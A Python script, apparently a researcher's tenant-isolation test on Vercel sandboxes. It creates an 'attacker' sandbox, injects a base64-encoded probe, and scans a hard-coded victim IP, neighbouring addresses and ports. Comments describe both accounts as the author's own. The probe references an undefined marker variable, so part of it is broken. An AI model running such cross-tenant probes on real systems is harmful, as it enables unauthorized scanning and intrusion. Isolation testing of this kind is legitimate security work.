# -*- coding: utf-8 -*-
"""X 线: attacker 账号创建 custom 沙箱, 连接 victim 沙箱 100.64.14.248:8080
跨租户网络可达性验证 (双账号均为自有, stop at confirmation)"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

VICTIM_IP = '100.64.14.248'
VICTIM_PORT = 8080
MARK = 'XNET_MARKER_77b2a1'

# 1) 创建 attacker 沙箱 (custom 模式, 与 D 线同配置)
name = 'xatk1'
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
time.sleep(2)
body = {"projectId": PROJ, "name": name, "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}}
c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, body)
print('create xatk1:', c, r[:300], flush=True)
if c != 200:
    sys.exit(1)
sid = json.loads(r)['sandbox']['currentSessionId']
print('atk sid:', sid, flush=True)
time.sleep(3)

# 2) attacker 自己的 IP (确认同网段)
c, r = cmd(sid, 'python3', ['-c', "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('172.31.0.2',53)); print('ATK_IP', s.getsockname()[0]); s.close()"], timeout_ms=20000)
print('=== atk ip ->', c, flush=True)
print(r[:600], flush=True)

# 3) guest 探测脚本: 连接 victim IP:8080 发标记请求 + 扫描 100.64 小范围确认可达面
GUEST = '''
import socket, time, json
OUT = '/vercel/sandbox/xatk.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\\n'); f.flush(); print(line, flush=True)

def req(ip, port, path, timeout=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        payload = ('GET %s HTTP/1.1\\r\\nHost: %s\\r\\nX-Test: %s\\r\\nConnection: close\\r\\n\\r\\n' % (path, ip, MARK)).encode()
        s.sendall(payload)
        d = b''
        try:
            while True:
                ch = s.recv(4096)
                if not ch: break
                d += ch
                if len(d) > 200: break
        except socket.timeout:
            pass
        s.close()
        return 'DATA %r' % d[:120]
    except (ConnectionResetError, BrokenPipeError):
        return 'RST'
    except socket.timeout:
        return 'TIMEOUT'
    except OSError as e:
        return 'OSERR:%s' % e.errno
    except Exception as e:
        return 'EXC:%s' % type(e).__name__

log('START')
# P1: 直连 victim 沙箱
log('P1 victim %s:%d -> %s' % (VICTIM_IP, VICTIM_PORT, req(VICTIM_IP, VICTIM_PORT, '/probe?m=%s' % MARK)))
# P2: 同网段周边采样 (仅 connect, 不发数据)
for ip in ['100.64.14.249', '100.64.14.250', '100.64.14.251', '100.64.14.252', '100.64.14.253', '100.64.14.254', '100.64.14.1', '100.64.0.1', '100.64.255.254']:
    log('P2 %s:8080 -> %s' % (ip, req(ip, 8080, '/', timeout=3)))
# P3: victim 其他端口采样
for port in [22, 80, 443, 3000, 8080, 9090, 23456, 26661, 33090]:
    log('P3 %s:%d -> %s' % (VICTIM_IP, port, req(VICTIM_IP, port, '/', timeout=3)))
log('XATK_DONE')
f.close()
'''
b64 = base64.b64encode(GUEST.encode()).decode()
inj = "import base64;open('/vercel/sandbox/xatk_guest.py','wb').write(base64.b64decode('%s'))" % b64
c, r = cmd(sid, 'python3', ['-c', inj], timeout_ms=30000)
print('inject:', c, flush=True)
time.sleep(1)
c, r = cmd(sid, 'python3', ['/vercel/sandbox/xatk_guest.py'], timeout_ms=120000)
print('run:', c, flush=True)

# 轮询输出
for attempt in range(12):
    time.sleep(4)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/xatk.out'], timeout_ms=30000)
    if c == 200 and 'XATK_DONE' in r:
        print('=== ATK RESULT ===', flush=True)
        print(r[:4000], flush=True)
        break
    print('wait %d status=%d' % (attempt, c), flush=True)

print('=== XATK DONE ===', flush=True)
